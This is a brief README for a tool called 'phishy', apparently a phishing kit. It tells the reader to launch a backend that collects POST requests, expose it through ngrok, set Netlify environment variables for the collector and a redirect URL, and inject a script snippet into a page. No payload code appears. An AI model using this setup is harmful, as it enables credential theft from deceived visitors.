# phishy

Super light and fast server backend for retrieving POST requests.

## Usage

Launch the backend server and expose it to the internet. Preferably, use port 5000 or higher.

```bash
sh launch.sh <port>
```

Set the backend server URL as the `SERVER_URL` environment variable.

```bash
netlify env:set SERVER_URL "<ngrok-URL>"
```

You can also set a URL the visitor will be redirected to with the `REDIRECTING_URL` environment variable.

```bash
netlify env:set REDIRECTING_URL "<URL>"
```

Finally, inject the following HTML snippet before `</head>`.

```html
<script>
  class NetlifyInjection {
    static SERVER_URL = "{{ SERVER_URL }}"
    static REDIRECTING_URL = "{{ REDIRECTING_URL }}"
  }
</script>
```

## Known Issues

If you receive the following error, please check if an AdBlocker is active.

```javascript
TypeError: NetworkError when attempting to fetch resource.
```
